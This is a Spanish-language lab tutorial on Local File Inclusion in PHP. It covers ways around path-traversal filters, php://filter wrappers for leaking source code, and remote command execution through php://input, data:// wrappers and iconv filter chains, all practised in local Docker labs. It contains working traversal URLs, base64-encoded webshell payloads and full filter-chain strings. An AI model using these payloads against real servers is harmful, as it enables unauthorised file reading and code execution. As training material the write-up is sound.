------
- Tags: #vulnerabilidades #web #lfi
-----
# Definición

> La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al **abusar de parámetros de entrada en la aplicación web**. Los **parámetros de entrada** son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden **manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud**, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de **LFI**.

En el ataque de **Path Traversal**, el atacante utiliza **caracteres especiales y caracteres de escape en los parámetros de entrada** ``/var/www/html/../../../../../../etc/passwd`` para navegar a través de los directorios del servidor web y acceder a **archivos en ubicaciones sensibles** del sistema.
Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para **prevenir los ataques LFI**, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

Hay que entender que LFI hay por todas partes, en **Gestores de contenido**, en **Plugins**, en **Plugins de Wordpress** y muchos lugares mas.

-----
# Laboratorio en apache2 para LFI
## LFI BASE

Comenzaremos explicando **como es que funciona la vulnerabilidad LFI** y diferentes formas que los desarrolladores web pueden optar para **sanitizar** la misma, y como en base a la sanitización que apliquen, **poder seguir vulnerando**.

Nos dirigiremos al directorio ``/var/www/html/`` y ahí crearemos un archivo ``index.php`` para simular un entorno web con ciertas condiciones.

Lo primero que haremos será que cuando por ejemplo nosotros en nuestro navegador ingresemos al localhost mientras montamos un servidor con apache2, cuando apuntemos al archivo ``index.php`` podremos empezar a explotar el LFI.
Una de las cosas que queremos conseguir es cuanto nosotros coloquemos ``localhost/index.php?filename=un-archivo-cualquiera`` podamos listar el contenido de un archivo que especifiquemos. A modo de prueba crearemos dentro del directorio ``/var/www/html`` un archivo llamado ``test`` que contenga una cadena de texto que diga cualquier cosa tal que **"Esto es una prueba"**.

```php
	$filename = $_GET['filename']; // Acá se indica que mediante una petición por GET que voy a tramitar en la URL, cuando pongamos "filename=" a algo, ese algo es lo que vamos a recibir y lo almacenaremos en filename.
	include(filename); // Acá lo que hacemos es usar un include para que nos muestre por la web el contenido de filename.
```

Ahora con ``service apache2 start`` abrimos el servidor por el puerto 80, y cuando en la web colocamos http://localhost/index.php?filename=test veremos el contenido del archivo test que creamos a modo de ejemplo.
Hay que entender que el ``index.php`` que definimos previamente **no está sanitizado en lo absoluto**, y que esto es vulnerable completamente a **LFI**.

Lo que podríamos hacer como atacantes al ver que la web hace una petición hacia un archivo especifico en el servidor, es testear si es vulnerable a LFI colocando en vez del archivo test, un archivo que se ubique en otra ruta como por ejemplo el archivo ``/etc/passwd``, esto no te lo suele permitir ya que es básica la sanitización que se utiliza, pero no perdemos nada intentando. nunca se sabe.

------------
## LFI Directory Path Traversal

Ahora aplicaremos una sanitización básica para que los usuarios que ingresen a la web puedan listar o buscar archivos **únicamente** dentro del directorio ``/var/www/html/``

```php
	$filename = $_GET['filename'];
	include("/var/www/html/" . $filename); // Sanitización concatenando con el "." el valor que otorgue el visitante de la web en el campo "filename", por defecto el "/var/www/html/" se aplicaría antes de "filename"
```

En este caso solo podríamos listar el contenido del archivo ``test`` que habíamos creado, pero únicamente ese, ya que es el único archivo que tenemos en el directorio ``/var/www/html/``

Ahora para vulnerar esta sanitización podríamos hacerlo **utilizando en la URL la siguiente cadena de caracteres** ``/../../../../../`` quedando tal que así http://localhost/index.php?filename=/../../../../ esto lo que está haciendo por detrás es retroceder de directorios, yendo en dirección a la raíz, por lo tanto luego de esos ``/../`` podríamos listar un archivo especifico de la máquina en una ruta que queramos. Por ejemplo el archivo ``/etc/passwd``

Si el OUTPUT lo deseamos ver de mejor forma, podemos utilizar **``CTRL+U``** en la web

![[LFI 1.png]]

------
### Sanitización #2

Ahora imaginemos que como desarrolladores no queremos que se permita el uso de ``../`` en la URL, para eso modificaremos el archivo index.php previo.

```php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename); // Sanitización, Indicamos que en el input que se coloque en "filename" cuando haya "../" se convierta a nada.
	include("/var/www/html/" . $filename);
```

Bien, esto sirve un poco, pero se puede burlar de todas formas.

Como nos inhabilitaron el uso de ``../`` hay que entender que esta sanitización **NO APLICA DE MANERA RECURSIVA**, por lo tanto si utilizamos ``localhost/index.php?filename=....//....//....//....//....//etc/passwd`` lo burlaremos ya que solamente eliminará la primer coincidencia, y nosotros como lo repetimos una vez mas, esa vez extra quedará colgada en la petición.

![[LFI 2.png]]

-----

### Sanitización #3

Ahora pondremos una sanitización con el uso de la función ``preg_match`` que lo que hará es que **Matchee** mediante expresiones regulares cuando el usuario coloque el string "**passwd**" o "**/etc/passwd**" y que no se lo muestre.

Acá se indica que si la palabra "/etc/passwd" aparece, se reproducirá el echo, en caso contrario, mostrará el contenido del archivo (Si es que existe y está en "/var")

```php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);

	if(preg_match("/\/etc\/passwd/", $filename) == 1){   // Se encierra entre "/" la palabra que quieras, en este caso /etc/passwd, pero las "/" del /etc/passwd deben ser escapadas con "\", por que en Regex es otra cosa
		echo "\n[!] No puedes visualizar este archivo";
	} else {
		include("/var/www/html/" . $filename);
	}
```

Para poder vulnerar esto, hay que entender que por ejemplo a la hora de hacer un ``cat /etc/passwd`` en consola, nos listará el contenido, pero si hacemos un cat ``////etc////paswd`` también nos los listará o también ``////etc///.//passwd``, da igual cuantas ``/`` o ``.`` metas, te lo listará igual, por lo tanto en la URL **podemos burlar la sanitización anterior** de esa forma.

![[LFI 3.png]]

Cabe destacar que también, en algunos casos se puede hacer uso del símbolo ``?`` cuando se emplea un ``cat`` de la siguiente forma ``cat /et?/pas?w?`` por ejemplo. Este símbolo lo que hace es que el sistema **busque coincidencias automáticamente**.

---------
### Sanitización #4

El desarrollador web por ejemplo, también puede **concatenar una extensión**, por ejemplo ".php". De forma que si listamos el ``/etc/passwd``, la sanitización lo que hará será listar un archivo ``/etc/passwd.php``, el cual no existe.

```php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);
	
	include("/var/www/html/" . $filename . ".php");
```

Para poder vulnerar esto se utiliza algo llamado **NULL BYTE** lo cual se hace utilizando ``%00`` o ``0\``, lo cual genera que de un archivo que le solicitemos al servidor por ejemplo el ``/etc/passwd%00``, omita todo el contenido siguiente a ese archivo, incluyendo la extensión ``.php``, por lo tanto estaríamos bypasseando la sanitización. El problema de esto es que a día de hoy el uso de **NULL BYTES solo sirve para versiones de PHP inferiores a las 5.3**.

-------

### Sanitización #5

El desarrollador web también puede hacer uso de ``$argv[1],-6,6`` esto en donde dice "1" va a hacer alusión a lo que nosotros le estemos pasando como argumento, en nuestro caso como queremos listar el contenido del ``/etc/passwd``, el argumento de sería ``/etc/passwd``, y el "-6,6" hace alusión a los últimos seis caracteres de la cadena que le estemos pasando. A continuación se mostrará en el script.

```php
    $filename = $_GET['filename'];

if(substr($argv[1],-6,6))!= "passwd"{
    include("/var/www/html/" . $filename);
  } else {
    echo "[!] No puedes ver el contenido de este archivo";
```

Para vulnerar esto simplemente cómo al intentar abrir el ``/etc/passwd`` nos dirá "**No puedes ver el contenido de este archivo**" podemos utilizar ``/.`` para burlar la sanitización errónea, quedando la petición tal que así ``/etc/passwd/.``.
Esto solamente sirve para versiones inferiores a las 5.3 de PHP.

-------
# Laboratorio en Github para LFI

El laboratorio que nos montaremos es el siguiente https://github.com/NetsecExplained/docker-labs mediante un ``git clone``, luego ingresamos a ``/docker-labs/file-inclusion/college_website/`` y luego utilizamos ``docker-compose up -d``

Una vez ingresamos a la web veremos un portal de lo que parece ser una escuela, prestaremos atención al URL ya que parece que al movernos por las diferentes pestañas (Home, About us, Courses, etc) está llamando a un archivo, si nosotros borramos lo que sigue luego de ``page=`` y colocamos otra cosa, veremos que sucede http://localhost:8081/index.php?page=/etc/passwd.

![[LFI 4.png]]

Solo nos está interpretando la ruta pero no nos lista el contenido, **no está siendo ejecutada como tal**. Ahora probemos ir por ejemplo a **Courses** otra vez.
Veremos que arriba pone ``page=courses`` pero esa sección si tiene contenido, un documento llamado "*Bachelor Of Science In Computer Science*", por lo tanto está siendo ejecutada, por lo que podemos deducir que debe tener algún tipo de extensión.

![[LFI 5.png]]

Ahora intentemos ver si el archivo courses existe como tal, pero probemos con la extensión ``.php``, esta vez como queremos verificar si existe, hagámoslo de la siguiente forma http://localhost:8081/courses.php intentando listar desde el mismo ``/var/www/html/`` que creemos que pueda existir.

![[LFI 6.png]]

¡EXISTE! por lo tanto ya con esto podemos deducir que el ``index.php`` le agrega al nombre del archivo que llamemos la extensión ``.php`` de forma automática.
Cuando antes hicimos el ``/etc/passwd``, en realidad por detrás hacíamos un ``/etc/passwd.php``

Ahora probemos utilizar un **NULL BYTE** para ver si podemos sacarnos de encima el ``.php``, pero esto **no funciona** porque si hacemos un ``whatweb localhost:8081``, ya que se ve que la versión de PHP *es mayor a la 5.3*.

--------
## Wrappers

Ya sabemos que **la web interpreta y ejecuta archivos** con extensiones ``.php``, pero hay que saber que a veces como atacantes **nos interesa ver el código en vez de que nos lo interprete**, esto se puede hacer mediante la utilización de **Wrappers** como lo vimos en la vulnerabilidad *XXE (XML External Entity Injection)*.

A modo de ejemplo entraremos con un bash al contenedor que está montando el servidor web del laboratorio, lo haremos con ``docker exec -it college_website_web_1 bash``. Luego abriremos con NANO el *index.php*.
Encontraremos una parte del código en donde encontramos este ``include $page. '.php';``, esto es lo que agrega de manera automática un *".php"* a nuestra petición web.

![[LFI 7.png]]

Ahora lo que haremos será **quitar la concatenación del php** dejando ``include $page;``, esto lo que hará es que si vamos a la web y por ejemplo intentamos abrir la sección de "courses" no podremos porque de forma manual tendremos que agregarle el ".php" al final. http://localhost:8081/index.php?page=courses.php.

Con esto que hicimos claramente podremos apuntar al */etc/passwd*, pero no podríamos hacerlo de esta forma ya que no tendríamos acceso al *index.php*.

Ahora si quisiéramos ver el código del *index.php*, podríamos hacerlo empleando el uso de **Wrappers**.

- **php://filter/convert.base64-encode/resource=(archivo.php)** - este Wrapper **permite ingresar o apuntar a un recurso** pero aplicando un filtro, este te permite por ejemplo mediante una **conversión** representar los datos contenidos en el archivo en base64 por ejemplo.
- **php://filter/read=string.rot13/resource=(archivo.php)** - este Wrapper lo que hace es **rotar cada carácter** en trece posiciones hacia la derecha *(CIFRADO CESAR)*
- **php://filter/convert.iconv.utf-8.utf-16/resource=(archivo.php)** - este Wrapper lo que hace es permitirnos ver el código sin que sea interpretado

Si usamos el Wrapper anterior apuntado hacia el archivo *index.php* veremos su contenido pero en **base64**, gracias a esto no será interpretado. Si esa cadena la **decodificamos** en la shell metiendo el contenido en un archivo, veremos el contenido y tendremos una copia exacta del index.php en nuestro sistema. ``echo -n "index-en-base64" | base64 -d | sponge data``

Una vez abierto el archivo **data** que posee el contenido del *index.php* podemos **investigar si hay alguna sección del código que incluya a otro archivo** que se vea "valioso".

![[LFI 8.png]]

Ahora que sabemos de la existencia de este archivo, podemos ir a la web y **buscar su contenido pero aplicando el Wrapper con base64** como en el caso anterior con el *index.php*.

![[LFI 9.png]]

Realizamos **lo mismo que hicimos con el index.php**, llevando todo decodificado a un archivo en nuestra directorio local.

![[LFI 10.png]]

De esta manera tenemos una forma potencial de **listar el contenido de un archivo .php sin que sea ejecutado** empleando el uso de *Wrappers*.

------
# Laboratorio en Local para LFI

Para hacer todo esto funcional de nuestro lado, si nosotros quisiéramos montarnos un laboratorio en local para **practicar** y ver como se **habilitan/deshabilitan el empleo de Wrappers** en una web, ya que hay muchas webs que lo tienen habilitado a día de hoy, lo haríamos de la siguiente forma.

- Primero borramos todo el contenido de **Imagen, contenedores y volumes** del **Docker**, luego hacemos un ``docker pull ubuntu:latest``, ``docker run -dit -p80:80 --name testing (container-code``), y luego un ``docker exec -it (code) bash``.
- Luego hacemos un ``apt update``,  ``apt install nano``, ``apt install apache2 php``.
- Hacemos un ``service apache2 start``.
- Nos dirigimos hacia ``/var/www/html``, eliminamos el *index.php* actual y creamos uno nuevo colocándole un ``echo "Hola"`` a modo de ejemplo, de esta forma si vamos a la Web y vemos "Hola", es que nos interpreta *php* correctamente.

Ahora lo que haremos será modificar el archivo *index.php* y colocaremos lo mismo que hicimos en las sanitizaciones anteriores

```php
$filename = $_GET['filename'];
include($filename);
```

Ahora crearemos un archivo *secret.php* a modo de ejemplo con una comentario que diga "No deberías verme" en la misma ruta donde está el *index.php*

```php
<?php
	// No deberias poder verme, debido a que este codigo deberia ser interpretado.
?>
```

Si vamos a la web y listamos el contenido del **/etc/passwd** lo podremos ver porque no hay sanitizaciones, pero si intentamos ver el archivo *secret.php* no podremos, ya que en vez de leer el código, el archivo será interpretado.
http://localhost:80/?filename=secret.php ==USAR CTRL+U PARA VER EN UN FORMATO MEJOR==.

--------

Ahora **si hacemos uso del Wrapper ``php://filter/convert.base64-encode/resource=(archivo.php)``, podremos ver el contenido en base64**, ya que el Wrapper por defecto está habilitado.

![[LFI 11.png]]

--------

Ahora **si hacemos uso del Wrapper ``php://filter/read=string.rot13/resource=(archivo.php)``, lo que hará es rotar cada carácter en trece posiciones** *(CIFRADO CESAR 'ROT13')* ==SOLO FUNCIONA CON CTRL+U, SI NO NO SE VERÁ==

![[LFI 12.png]]

Todo esto podemos copiarlo, meterlo en un archivo llamado '**data**' y decodificarlo en nuestra shell de la siguiente manera ``cat data | tr 'a-zA-Z' 'n-za-mN-ZA-M'``

![[LFI 13.png]]

------

Ahora **si hacemos uso del Wrapper ``php://filter/convert.iconv.utf-8.utf-16/resource=(archivo.php)``**, podremos ver el contenido del archivo *php* sin que sea interpretado. ==SOLO FUNCIONA CON CTRL+U, SI NO NO SE VERÁ==

![[LFI 14.png]]

# RCE derivado de un LFI con Wrappers

- Abriremos el **Burpsuite** para poder tener una visión mas clara de todo lo que vamos a estar haciendo ahora, luego 
- Interceptaremos una petición cualquiera de la web anterior, tal que http://localhost:80/?filename=hola.
- Enviaremos la petición al **Repeater**

Algo a tener en cuenta que hay mucha variedad de Wrappers, hay uno llamado **Expect** que es interesante ya que si colocamos en el Burpsuite en el apartado de la petición por GET lo siguiente ``GET /?filename=expect://whoami``, podríamos llegar a **intentar ejecutar comandos de manera remota (RCE)**, pero en este caso no funciona porque no está habilitado.

![[LFI 15.png]]

------

Otro Wrapper existente para **RCE** es ``php://input``, pero en este caso se debe cambiar la petición GET a *POST* dando click derecho y *change request method*, agregar la linea ``/?filename=php://input``, para luego al final del todo el código colocar la siguiente cadena en *php* para ejecutar comandos ``<?php system("whoami"); ?>``.

En nuestro caso al realizar ``CTRL+ESPACIO`` para enviar la solicitud **no nos devolverá nada** porque debemos modificar un archivo ubicado en la siguiente ruta */etc/php/8.1/apache2/php.ini* dentro del contenedor. 
Utilizamos NANO y buscamos la linea que diga **allow_url_include** y lo colocamos en ==ON==, ahora funcionará.

![[LFI 16.png]]

Con esto podríamos realizar una **Reverse Shell para tener una consola interactiva** en nuestra shell para mas comodidad.

------

Otro Wrapper existente para **RCE** es ``data://text/plain;base64,(código-en-base64)``, debiendo cambiar la petición a *GET*. Con este Wrapper por ejemplo **podemos enviar una cadena con un código php en base64 para que sea decodificado y a la vez interpretado**, dándonos así el resultado del comando que ejecutemos. 

A continuación se colocará el código ``<?php system("whoami"); ?>`` en base64 quedando tal que así *PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=*

![[LFI 17.png]]

Algo que se podría hacer para que no tengamos que estar cambiando de base64 a texto plano constantemente sería codificar en base64 lo siguiente ``<?php system($_GET["cmd"]); ?>`` quedando tal que así *PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+* luego le debemos agregar pegado la cadena esto ``&cmd=whoami`` que lo que hace es llamar al contenido de "cmd", el cual se lo estamos pasando nosotros "whoami". 
Lo mas probable es que no funcione porque debemos ==URLENCODEAR== toda la cadena en base64 por el "+" (ese símbolo se suele interpretar como un espacio en una solicitud **HTML**), esto lo hacemos marcando toda la cadena en base64 y luego presionamos ``CTRL+U`` para URLENCODEAR.

![[LFI 18.png]]

De esta forma **solo debemos modificar el comando** en ``&cmd=`` y listo.

--------
# RCE con un LFI con el uso de Filter Chains

Una forma poco conocida para poder efectuar un **RCE** a través de un **LFI** es hacer uso de *Filter Chains* o *Cadenas de filtros*, las cuales podemos utilizar mediante el empleo de un **Wrapper** para luego jugar con "iconv" para aplicar encoding, esto simplemente es un proceso por el cual **determinado carácter lo representamos en otro formato**.

Crearemos un archivo llamado *test* el cual contendrá una cadena de texto que diga "*Hola*" pero en Base64 tal que así "*SG9sYQo=*"

En este caso usaremos el **Wrapper de decodificación y codificación en base64** que usamos previamente. 

Si nosotros intentamos decodificar con el Wrapper de base64 agregándole un ``=`` extra a la cadena del archivo *test*, veremos que nos da el mismo resultado "Hola", si le quitamos ambos nos dará lo mismo también, ahora si le colocamos los dos ``==`` en otra parte nos dará un error o la web no nos mostrará contenido.

Lo primero que tenemos que entender es que este Wrapper ``php://filter/convert.base64-decode/resource=test`` suele tener problemas a la hora de intentar **DECODIFICAR** una cadena en Base64 que contenga ``==`` en algunas partes de la misma, para evitar este problema podemos hacer lo siguiente agregándole ``convert.iconv.UTF8.UTF7`` al Wrapper anterior ``php://filter/convert.iconv.UTF8.UTF7|convert.base64-decode/resource=``. Siempre separado por una PIPE ``|`` 
==(ESTO ES A MODO EXPLICATIVO PARA LO QUE SIGUE, POR LO TANTO NO FUNCIONA SI LO PROBAMOS)==

En cuanto a encoding respecta podemos utilizar **diferentes conversiones que podríamos aplicar a nivel de tratamiento de caracteres**, uno de ellos es por ejemplo el siguiente ``convert.iconv.UTF8.CSISO2022KR``, acá estamos diciendo que de *UTF8* lo pasaremos a *CSISO2022KR* que es el tipo de encoding que vamos a aplicar (Hay muchos tipos que veremos mas adelante con una herramienta). 
Todo quedaría tal que así ``php://filter/convert.iconv.UTF8.CSISO2022KR/resource=``, nosotros al hacer esto veremos que se están agregando caracteres adelante de la cadena nuestra, podemos verlo con un ``echo`` o con ``xxd``

Todo esto visto desde el interprete de **PHP** sería tal que así

![[LFI 19.png]]

Si nosotros ahora borramos el único `=` que hay en el archivo test, quedando la cadena así "*SG9sYQo*" y ejecutamos el Wrapper denuevo, la respuesta se mantendrá igual, pero si nosotros decodificamos y después codificamos en la misma linea, la cadena en Base64 **tendrá una carácter extra**, que en este caso es una "*C*", este carácter agregado ==se puede manipular==, por lo tanto podríamos agregar una cadena de texto **PASO POR PASO** que nosotros quisiéramos como "*Prueba*" por ejemplo o también que es lo que mas interesa, **agregar una linea de código maliciosa**. ==HAY QUE ENTENDER QUE "CSISO2022KR" SE UTILIZA PARA ABRIR UN HUECO POR EL CUAL PODREMOS METER CARACTERES A GUSTO==

![[LFI 20.png]]

Utilizaremos el siguiente recurso https://github.com/synacktiv/php_filter_chain_generator para **ver cada carácter con su respectiva conversión**, por lo tanto podríamos ir copiando que encoding representa a cada letra que queramos utilizar, en este caso a modo de ejemplo colocaremos la cadena "*Prueba*".

--------

- [.1.] Comenzaremos colocando en la linea de **php** en vez del archivo *test* que teníamos en el directorio ``/var/www/html/test`` el directorio ``php://temp`` ya que esta ruta sirve cuando desconocemos las rutas existentes en la máquina victima. 
- [.2.] Vamos a tener que invertir la palabra *Prueba*, ya que los caracteres tendrán que ser ingresados de atrás para adelante, ya que estos se agregan de derecha a izquierda, "*abeurP*", por lo tanto comenzamos con la letra "*a*".
- [.3.] Copiamos la linea de encoding correspondiente a la letra "*a*" del repositorio en Github luego del *CSISO2022KR* separado por una PIPE ``php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE/resource=php://temp``
- [.4.] Luego de agregar el encoding correspondiente a la letra "*a*" a un lado aplicaremos el **decoding** y luego el **encoding**, siempre todo separado por PIPES.
- [.5.] Luego a la derecha del **encoding** colocamos una **PIPE** y agregamos el Wrapper que evita el conflicto con los ``==`` por las dudas (==ESTE WRAPPER SIEMPRE IRÁ A LA DERECHA DEL TODO Y AL PRINCIPIO LUEGO DEL CSISO2022KR==), todo esto quedaría así ``php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode/resource=php://temp``

Por el momento nuestra linea de **código PHP** sería de la siguiente manera y si prestamos atención el resultado tendrá una "*a*" al principio que fue la que agregamos con su respectivo encoding.
- ``php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');"; echo``

![[LFI 21.png]]

Ahora lo que deberíamos hacer es repetir del paso [3] y [4] para cada letra que queramos agregar.

La palabra "Prueba" completa quedaría de la siguiente manera y nos devolverá el siguiente OUTPUT.

- ``php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101|convert.base64-decode|convert.base64-encode|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');"; echo``

![[LFI 22.png]]

Si copiamos el código desde que aplicamos el primer Wrapper, hasta ``php://temp`` en la web, podríamos inyectar la cadena de texto en la misma.

-------

Esto que hicimos con la palabra "*Prueba*" lo podríamos hacer tranquilamente con la linea de código ``<?php system("whoami") ?>`` solo que si buscamos en el repositorio de Github el encoding del símbolo ``<`` y ``>`` **veremos que no existe**, por lo tanto esto se solucionaría fácilmente **pasando el código a Base64**, quedando tal que así **PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSkgPz4=**, luego eliminamos el ``=`` del final porque no afecta que lo hagamos y para evitar conflictos, para luego hacer **encoding de toda la cadena en Base64**.

Hacer lo anterior **sería muy tedioso para una cadena extensa** como la cadena en Base64 que tenemos, por lo tanto ahora que sabemos como se hace de manera manual, **podemos utilizar la herramienta del mismo repositorio** para que lo **automatice**, todo lo dicho anteriormente la herramienta lo hace de manera automática. (El base64 de ``<?php system("whoami") ?>``, el ``rev``, etc.)

![[LFI 23.png]]

Esto copiado y **enviado a la Web** quedaría así

![[LFI 24.png]]

¡Tendríamos **RCE**!

Para maximizar aún mas podemos usar ``<?php system($_GET['cmd']) ?>`` y al final de toda la cadena hiper larga que nos da la herramienta agregar un ``&cmd=`` y luego del ``=`` **colocaríamos el comando que quisiéramos**, en nuestro caso una **Reverse shell**.

![[LFI 25.png]]

-----

# Listar el contenido del /proc/net/tcp para ver puertos internos abiertos

Una vez detectamos el **LFI** vamos a listar el contenido del directorio ``/proc/net/tcp``, en mi caso me da el siguiente resultado

![[LogP 9.png]]

Lo que haremos será **copiar todo esto** y meterlo en un archivo ``data``, luego haremos lo siguiente

- ``cat data | awk {'print $2'} | awk {'print $2'} FS=":" | sort -u``

De esta forma solo nos quedaremos con este contenido.

![[LogP 10.png]]

Estos valores son **puertos en Hexadecimal**, por lo tanto simplemente los cambios a decimal iterando por cada uno de ellos.

- ``for port in $(cat data | awk {'print $2'} | awk {'print $2'} FS=":" | sort -u); do echo "[+] Puerto $port --> ABIERTO"; done``

![[LogP 11.png]]

Ahora si al condicional le agregamos un ``$((0x$port))`` veremos los puertos en decimal, tal que así

- ``for port in $(cat data | awk {'print $2'} | awk {'print $2'} FS=":" | sort -u); do echo "[+] Puerto $port $((0x$port))--> ABIERTO"; done``

![[LogP 12.png]]

